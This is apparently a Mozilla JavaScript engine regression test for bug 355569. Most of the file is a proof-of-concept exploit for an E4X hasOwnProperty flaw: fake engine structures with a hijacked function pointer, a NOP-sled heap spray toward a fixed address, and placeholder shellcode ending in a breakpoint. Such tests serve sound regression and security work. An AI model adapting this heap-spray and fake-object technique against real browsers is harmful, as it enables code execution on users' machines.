/* -*- Mode: java; tab-width:8; indent-tabs-mode: nil; c-basic-offset: 4 -*- */

/* ***** BEGIN LICENSE BLOCK *****
 * Version: MPL 1.1/GPL 2.0/LGPL 2.1
 *
 * The contents of this file are subject to the Mozilla Public License Version
 * 1.1 (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 * http://www.mozilla.org/MPL/
 *
 * Software distributed under the License is distributed on an "AS IS" basis,
 * WITHOUT WARRANTY OF ANY KIND, either express or implied. See the License
 * for the specific language governing rights and limitations under the
 * License.
 *
 * The Original Code is JavaScript Engine testing utilities.
 *
 * The Initial Developer of the Original Code is
 * Mozilla Foundation.
 * Portions created by the Initial Developer are Copyright (C) 2006
 * the Initial Developer. All Rights Reserved.
 *
 * Contributor(s): shutdown
 *
 * Alternatively, the contents of this file may be used under the terms of
 * either the GNU General Public License Version 2 or later (the "GPL"), or
 * the GNU Lesser General Public License Version 2.1 or later (the "LGPL"),
 * in which case the provisions of the GPL or the LGPL are applicable instead
 * of those above. If you wish to allow use of your version of this file only
 * under the terms of either the GPL or the LGPL, and not to allow others to
 * use your version of this file under the terms of the MPL, indicate your
 * decision by deleting the provisions above and replace them with the notice
 * and other provisions required by the GPL or the LGPL. If you do not delete
 * the provisions above, a recipient may use your version of this file under
 * the terms of any one of the MPL, the GPL or the LGPL.
 *
 * ***** END LICENSE BLOCK ***** */
gTestfile = 'regress-355569.js';

var bug = 355569;
var actual = '';
var expect = '';

START('XML.prototype.hasOwnProperty foo');
printBugNumber (bug);
printStatus (summary);

var targetAddress = 0x12030010;
var sprayParams = {
  chunkSize: 16 * 1024 * 1024,
  chunkCount: 16,
  chunkMarker: 0xdeadface,
  chunkAlign: 0x1000,
  reservedSize: 1024
};

function makeExploitCode() {
  /* mov eax, 0xdeadfeed; mov ebx, eax; mov ecx, eax; mov edx, eax; int3 */
  return "\uEDB8\uADFE\u89DE\u89C3\u89C1\uCCC2";
}

/*==========================================================================*/
/*==========================================================================*/

function packData(template, A) {
  var n = 0, result = "", vl;
  for(var i = 0; i < template.length; i++) {
    var ch = template.charAt(i);
    if(ch == "s" || ch == "S") {
      vl = A[n++] >>> 0; result += String.fromCharCode(vl & 0xffff);
    } else if(ch == "l" || ch == "L") { // XXX endian
      vl = A[n++] >>> 0; result += String.fromCharCode(vl & 0xffff, vl >> 16);
    } else if(ch == "=") {
      result += String(A[n++]);
    }
  }
  return result;
}
function buildStructure(worker, address) {
  var offs = {}, result = "", context = {
    append: function(k, v) { offs[k] = result.length * 2; result += v; },
    address: function(k) { return address + ((k && offs[k]) || 0); }
  }; worker(context); result = ""; worker(context); return result;
}
function repeatToLength(s, L) {
  if(L <= s.length) { return s.substring(0, L); }
  while(s.length <= L/2) { s += s; }
  return s + s.substring(0, L - s.length);
}
function sprayData(data, params, rooter) {
  var marker = packData("L", [ params.chunkMarker ]);
  data += repeatToLength("\u9090", params.chunkAlign / 2 - data.length);
  data = repeatToLength(data, (params.chunkSize - params.reservedSize) / 2);
  for(var i = 0; i < params.chunkCount; i++) {
    rooter[i] = marker + data + i;
  }
}

function T_JSObject(map, slots)
{ return packData("LL", arguments); }
function T_JSObjectMap(nrefs, ops, nslots, freeslot)
{ return packData("LLLL", arguments); }
function T_JSObjectOps(
  newObjectMap, destroyObjectMap, lookupProperty, defineProperty,
  getProperty, setProperty, getAttributes, setAttributes,
  deleteProperty, defaultValue, enumerate, checkAccess,
  thisObject, dropProperty, call, construct,
  xdrObject, hasInstance, setProto, setParent,
  mark, clear, getRequiredSlot, setRequiredSlot
) { return packData("LLLLLLLL LLLLLLLL LLLLLLLL", arguments); }

function T_JSXML_LIST(
  object, domnode, parent, name, xml_class, xml_flags,
  kids_length, kids_capacity, kids_vector, kids_cursors,
  xml_target, xml_targetprop
) { return packData("LLLLSS LLLL LL", arguments); }
function T_JSXML_ELEMENT(
  object, domnode, parent, name, xml_class, xml_flags,
  kids_length, kids_capacity, kids_vector, kids_cursors,
  nses_length, nses_capacity, nses_vector, nses_cursors,
  atrs_length, atrs_capacity, atrs_vector, atrs_cursors
) { return packData("LLLLSS LLLL LLLL LLLL", arguments); }

/*==========================================================================*/
/*==========================================================================*/

function makeExploitData(address) {
  return buildStructure(function(ctx) {
    ctx.append("xml-list",
      T_JSXML_LIST(0, 0, 0, 0, 0, 0, 1, 0, ctx.address("xml-kids-vector"), 0, 0, 0));
    ctx.append("xml-kids-vector",
      packData("L", [ ctx.address("xml-element") ]));
    ctx.append("xml-element",
      T_JSXML_ELEMENT(ctx.address("object"), 0, 0, 0, 1, 0, 0, 0, 0, 0, /*c*/ 0, 0, 0, 0, /*d*/ 0, 0, 0, 0));
    ctx.append("object",
      T_JSObject(ctx.address("object-map"), 0));
    ctx.append("object-map",
      T_JSObjectMap(0, ctx.address("object-ops"), 0, 0));
    ctx.append("object-ops",
      T_JSObjectOps(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ctx.address("exploit-code"), 0));
    ctx.append("exploit-code",
      makeExploitCode(ctx));
  }, address);
}

function exploit() {
  sprayData(makeExploitData(targetAddress), sprayParams, this.rooter = {});
  var numobj = new Number(targetAddress >> 1);
  XML.prototype.function::hasOwnProperty.call(numobj);
  printStatus("probably not exploitable");
}

try
{
    exploit();
}
catch(ex)
{
}

TEST(1, expect, actual);

END();
